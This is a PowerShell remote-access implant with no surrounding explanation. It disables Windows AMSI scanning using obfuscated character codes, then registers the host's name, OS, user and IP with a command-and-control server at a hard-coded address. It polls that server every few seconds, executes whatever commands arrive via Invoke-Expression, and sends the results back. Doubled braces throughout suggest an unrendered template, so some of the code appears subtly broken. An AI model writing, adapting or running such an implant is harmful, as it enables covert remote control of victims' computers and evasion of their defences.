try{$KfFGPMcu=[Ref].Assembly.GetType(([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)-join''));$JpKcqpgP=$KfFGPMcu.GetField(([char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)-join''),'NonPublic,Static');$JpKcqpgP.SetValue($null,$true)}catch{}
$SDmWlARFPxlz="http://192.168.1.21:4444/api/c2"
function _req($e,$b){{Invoke-RestMethod -Uri "$SDmWlARFPxlz/$e" -Method Post -ContentType 'application/json' -Body ($b|ConvertTo-Json -Compress) -ErrorAction Stop}}
try{{$qnymrH=(Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex (Get-NetRoute '0.0.0.0/0').InterfaceIndex -EA Stop).IPAddress}}catch{{$qnymrH='unknown'}}
$MuVpuK=_req 'checkin' @{{hostname=$env:COMPUTERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption;username=$env:USERNAME;ip=$qnymrH}}
$ZpTgVIcE=$MuVpuK.agent_id
while($true){{
    Start-Sleep -Seconds 5
    try{{
        foreach($TVUAbKjcJ in ((_req 'beacon' @{{agent_id=$ZpTgVIcE}}).tasks)){{
            try{{$AkBrDPCxa=(Invoke-Expression $TVUAbKjcJ.command 2>&1|Out-String);$kCOdcZrs=$true}}catch{{$AkBrDPCxa=$_.Exception.Message;$kCOdcZrs=$false}}
            _req 'result' @{{agent_id=$ZpTgVIcE;task_id=$TVUAbKjcJ.id;result=$AkBrDPCxa;success=$kCOdcZrs}}|Out-Null
        }}
    }}catch{{}}
}}